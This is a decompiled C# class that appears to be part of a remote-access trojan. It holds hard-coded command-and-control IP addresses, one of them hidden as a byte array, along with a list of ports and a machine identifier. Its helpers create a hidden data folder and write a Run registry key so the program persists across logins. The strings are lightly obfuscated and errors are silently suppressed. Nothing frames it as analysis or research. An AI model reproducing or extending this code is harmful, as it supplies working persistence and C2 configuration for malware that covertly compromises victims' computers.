using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace dtiardhues;

internal static class DLAONIF
{
	public static string dtiardhuesappPath = "\\Mldriab\\|dtiardhues".Split(new char[1] { '|' })[0];

	public static string dtiardhuesdefaultP = "111.115.6.118|dtiardhues".Split(new char[1] { '|' })[0];

	public static string dtiardhuesmainApp = "dtiardhues|dtiardhues".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 3864, 4861, 12486, 14672, 16286 };

	public static byte[] dtiardhuesvpsips = new byte[12]
	{
		56, 49, 46, 49, 55, 46, 53, 54, 46, 50,
		50, 54
	};

	public static int dtiardhuesport;

	public static string dtiardhuespc_id = "hkrimd|dtiardhues".Split(new char[1] { '|' })[0];

	public static string dtiardhuesremvUser = "dlmawncd|dtiardhues".Split(new char[1] { '|' })[0];

	public static string dtiardhuesfilesLogs = "ntidrmar".Split(new char[1] { '|' })[0];

	public static string dtiardhuesAppPath = "";

	public static string dtiardhuesget_mpath()
	{
		if (dtiardhuesAppPath != "")
		{
			return dtiardhuesAppPath;
		}
		dtiardhuesAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + dtiardhuesappPath;
		try
		{
			if (!Directory.Exists(dtiardhuesAppPath))
			{
				Directory.CreateDirectory(dtiardhuesAppPath);
			}
			if (Directory.Exists(dtiardhuesAppPath))
			{
				return dtiardhuesAppPath;
			}
		}
		catch
		{
		}
		dtiardhuesAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + dtiardhuesappPath;
		try
		{
			if (!Directory.Exists(dtiardhuesAppPath))
			{
				Directory.CreateDirectory(dtiardhuesAppPath);
			}
			if (!Directory.Exists(dtiardhuesAppPath))
			{
				return dtiardhuesAppPath;
			}
		}
		catch
		{
		}
		dtiardhuesAppPath = Application.get_ExecutablePath();
		return dtiardhuesAppPath;
	}

	public static void dtiardhuesset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|dtiardhues".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = dtiardhuespc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string dtiardhuesOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!dtiardhues".Split(new char[1] { '!' })[0];
		}
	}
}
